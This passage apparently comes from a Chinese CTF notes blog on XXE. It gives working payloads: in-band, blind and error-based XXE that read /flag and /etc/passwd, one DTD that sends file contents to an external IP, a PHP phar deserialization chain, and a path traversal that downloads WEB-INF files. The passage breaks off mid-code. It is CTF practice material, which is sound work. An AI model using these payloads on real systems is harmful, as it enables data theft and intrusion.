class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<span class="hljs-comment">//LIBXML_NOENT 会将实体替换为它们的值，而 LIBXML_DTDLOAD 会加载外部 DTD。</span><br>    <span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$creds</span>-&gt;ctfshow; <span class="hljs-comment">//从 SimpleXMLElement 对象中提取名为 &quot;ctfshow&quot; 的元素。</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$ctfshow</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>XML 文件<br>一般表示带有结构的数据<br>祖父  3个叔父  8个堂弟堂妹   </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">祖父</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">叔父1</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">堂兄1</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">叔父1</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">叔父2</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">堂兄2</span>&gt;</span>    <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">叔父2</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">叔父3</span>&gt;</span><br><br>     <span class="hljs-tag">&lt;<span class="hljs-name">堂兄3</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">叔父4</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">祖父</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE&gt;</span> 声明定义了整个文档的类型，<span class="hljs-meta">&lt;!ENTITY&gt;</span> 声明定义了一个实体。<br>xml格式<br>1 有回显时文件读取方法<br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hacker</span>[</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">hacker</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span> <br><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ctfshow</span>&gt;</span><br>        <span class="hljs-symbol">&amp;hacker;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ctfshow</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br><br>php://filter/read=convert.base64-encode/resource=/flag<br></code></pre></td></tr></table></figure><p>2 无回显时文件读取方法</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hacker</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">myurl</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://47.236.120.83/test.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %myurl;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>1<br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>test.dtd内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#x25; vps SYSTEM &#x27;http://43.154.107.226:3389/%file;&#x27;&gt; &quot;&gt;<br>%dtd;<br>%vps;<br></code></pre></td></tr></table></figure><h3 id="报错xxe"><a href="#报错xxe" class="headerlink" title="报错xxe"></a>报错xxe</h3><ul><li>libxml&lt;&#x3D;2.8(2.9以后默认不使用外部实体)</li><li>开启了报错</li><li>无回显</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % a <span class="hljs-string">&#x27;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY &amp;#x25; b &quot;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">&quot;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">&#x27;</span>&gt;</span></span><br><span class="hljs-meta">%a;</span><br><span class="hljs-meta">%b;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>asfddasfd<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">condition</span> <span class="hljs-string">&#x27;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;eval;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;error;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">&#x27;</span>&gt;</span></span><br><span class="hljs-meta">    %condition;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>any text<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="xxePhar"><a href="#xxePhar" class="headerlink" title="xxePhar"></a>xxePhar</h3><p>弱口令<code>admin/admin</code>登录，会跳转到一个文件上传的点。可以先使用<code>XXE</code>逐一读取<code>doLogin.php</code>和<code>class.php</code>的文件内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#doLogin.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* autor: c0ny1</span><br><span class="hljs-comment">* date: 2018-2-7</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;class.php&quot;</span>);<br><span class="hljs-variable">$USERNAME</span> = <span class="hljs-string">&#x27;admin&#x27;</span>; <span class="hljs-comment">//账号</span><br><span class="hljs-variable">$PASSWORD</span> = <span class="hljs-string">&#x27;admin&#x27;</span>; <span class="hljs-comment">//密码</span><br><span class="hljs-variable">$result</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><br><span class="hljs-keyword">try</span>&#123;<br><span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br><span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br><span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$creds</span>-&gt;username;<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$creds</span>-&gt;password;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> == <span class="hljs-variable">$USERNAME</span> &amp;&amp; <span class="hljs-variable">$password</span> == <span class="hljs-variable">$PASSWORD</span>)&#123;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-variable">$username</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$username</span>);<br>&#125;<br>&#125;<span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)&#123;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">3</span>,<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>&#125;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">#class.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Fun</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&#x27;call_user_func_array&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;func,<span class="hljs-variable">$f</span>,<span class="hljs-variable">$p</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;FLAG&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;serialize me?&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/Test/&quot;</span>,<span class="hljs-title function_ invoke__">get_class</span>(<span class="hljs-variable">$this</span>-&gt;a)))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No test in Prod\n&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-variable">$p</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$p</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-variable">$p</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>构造序列化内容，exp如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Fun</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;func = <span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>,<span class="hljs-string">&quot;__call&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-variable">$a</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;aaa&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Fun</span>());<br><span class="hljs-variable">$a</span>-&gt;a = <span class="hljs-variable">$b</span>;<br><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>将生成的phar文件上传</p><p>最后利用XXE通过phar协议触发反序列化获得flag。 SYSTEM phar:&#x2F;&#x2F;&#x2F;temp&#x2F;phar.phat</p><h3 id="网鼎杯-FileJava"><a href="#网鼎杯-FileJava" class="headerlink" title="网鼎杯 FileJava"></a>网鼎杯 FileJava</h3><p>可以上传任意文件和下载文件，但是不能访问，所以不能用一句话连接，在下载文件功能发现可以下载任意文件，于是将WEB-INF&#x2F;web.xml页面下载,访问<code>/file_in_java/DownloadServlet?filename=../../../../WEB-INF/web.xml</code>,相关内容如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>DownloadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>cn.abc.servlet.DownloadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>DownloadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/DownloadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>ListFileServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>cn.abc.servlet.ListFileServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>ListFileServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/ListFileServlet<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>UploadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>cn.abc.servlet.UploadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>UploadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/UploadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p>发现有上传和下载的配置文件，由2个类组成，将这2个类进行下载。分别访问&#96;&#x2F;file_in_java&#x2F;DownloadServlet?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet</p><p>&#x2F;DownloadServlet.class<code>、</code>&#x2F;file_in_java&#x2F;DownloadServlet?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;UploadServlet.class<code>。使用</code>jd-gui.exe<code>分别进行反编译，其中</code>DownloadServlet.class&#96;源码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.abc.servlet;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintStream;<br><span class="hljs-keyword">import</span> java.net.URLEncoder;<br><span class="hljs-keyword">import</span> javax.servlet.RequestDispatcher;<br><span 